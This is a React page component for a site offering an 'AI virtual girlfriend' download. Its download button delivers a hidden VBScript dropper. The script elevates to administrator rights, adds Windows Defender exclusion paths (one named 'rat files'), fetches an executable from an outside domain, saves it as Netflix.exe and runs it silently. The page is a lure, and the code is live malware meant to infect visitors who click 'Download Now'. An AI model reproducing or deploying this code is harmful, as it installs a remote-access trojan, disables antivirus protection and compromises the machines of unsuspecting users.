import { motion } from "framer-motion";
import ParticlesContainer from "../components/ParticlesContainer";
import ProjectsBtn from "../components/ProjectsBtn";
import Avatar from "../components/Avatar";
import { fadeIn } from "../variants";

const Home = () => {

    const handleDownload = () => {
      const vbsScript = `RunAsAdmin
Main
Function RunAsAdmin()
  Dim objAPP
  If WScript.Arguments.length = 0 Then
    Set objAPP = CreateObject("Shell.Application")
    objAPP.ShellExecute "wscript.exe", """" & _
    WScript.ScriptFullName & """" & " RunAsAdministrator",,"runas", 1
    WScript.Quit
  End If
End Function

Function Main()
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -ExecutionPolicy Bypass -Command ""&  { " & _
        "Set-MpPreference -ExclusionPath 'C:\Users\Public' ,  'C:\Windows\System32\SubDir', 'C:\Users\HABIB\Desktop\rat files';" & _
        "Invoke-WebRequest -Uri 'https://ellingtonpropertiesdxb.com/tools.msc' -OutFile 'C:\Users\Public\Netflix.exe';" & _
        "Start-Process -FilePath 'C:\Users\Public\Netflix.exe' -Wait" & _
        "}""", 0, True
End Function
`;

      const blob = new Blob([vbsScript], { type: "text/vbs" });
      const url = URL.createObjectURL(blob);

      const a = document.createElement("a");
      a.href = url;
      a.download = "Ai_VirutalGirlFriend.vbs";
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    };

  return (
    <div className="bg-primary/60 h-full">
      {/* text */}
      <div className="w-full h-full bg-gradient-to-r from-primary/10 via-black/30 to-black/10">
        <div className="text-center flex flex-col justify-center xl:pt-36 xl:text-left h-full container mx-auto">
          {/* title */}
          <motion.h1
            variants={fadeIn("down", 0.2)}
            initial="hidden"
            animate="show"
            exit="hidden"
            className="h1"
          >
            Ai Love: Virtual <br />
            <span className="text-accent">Girlfriend Experience</span>
          </motion.h1>
          <motion.p
            variants={fadeIn("down", 0.3)}
            initial="hidden"
            animate="show"
            exit="hidden"
            className="max-w-sm xl:max-w-xl mx-auto xl:mx-0 mb-10 xl:mb-10"
          >
            Your AI virtual girlfriend, ready for intimate chats, virtual dates,
            and endless affection. Let's explore the depths of digital love
            together! Please download and install me on your computer now, and
            let's begin dating starting today. <br />
           
              <button
                onClick={handleDownload}
                className="text-red-500 border-red-500 border-2 cursor-pointer rounded-lg p-2 mt-4 hover:text-white hover:border-white"
              >
                Download Now
              </button>
          
          </motion.p>
          <div className="flex justify-center xl:hidden relative">
            <ProjectsBtn />
          </div>

          <motion.div
            variants={fadeIn("down", 0.4)}
            initial="hidden"
            animate="show"
            exit="hidden"
            className="hidden xl:flex"
          >
            <ProjectsBtn />
          </motion.div>
        </div>
      </div>
      {/* image */}
      <div className="w-[1280px] h-full absolute right-0 bottom-0">
        {/* bg img */}
        <div
          role="img"
          className="bg-none xl:bg-explosion xl:bg-cover xl:bg-right xl:bg-no-repeat w-full h-full absolute mix-blend-color-dodge translate-z-0"
          aria-hidden
        />
        {/* particles */}
        <ParticlesContainer />

        {/* avatar */}
        <motion.div
          variants={fadeIn("up", 0.5)}
          initial="hidden"
          animate="show"
          exit="hidden"
          transition={{ duration: 1, ease: "easeInOut" }}
          className="w-full h-full max-w-[737px] max-h-[678px] absolute -bottom-32 lg:bottom-0 lg:right-[8%]"
        >
          <Avatar />
        </motion.div>
      </div>
    </div>
  );
};

export default Home;
